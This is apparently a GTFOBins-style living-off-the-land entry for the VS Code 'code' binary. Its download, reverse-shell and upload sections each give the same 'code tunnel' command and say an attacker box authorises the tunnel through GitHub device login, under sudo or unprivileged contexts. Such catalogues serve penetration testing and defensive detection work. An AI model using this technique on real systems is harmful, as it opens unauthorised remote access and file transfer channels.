---
type: gtfobin
name: code
platform: Unix
functions: [download, reverse-shell, upload]
tags: [gtfobin, unix, lotl]
---

# code

## download

```bash
code tunnel --name xxxxxx
```
_This requires a valid GitHub account.

Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel._
**Contexts:** sudo, unprivileged

## reverse-shell

```bash
code tunnel --name xxxxxx
```
_This requires a valid GitHub account.

Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel._
**Contexts:** sudo, unprivileged

## upload

```bash
code tunnel --name xxxxxx
```
_This requires a valid GitHub account.

Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel._
**Contexts:** sudo, unprivileged
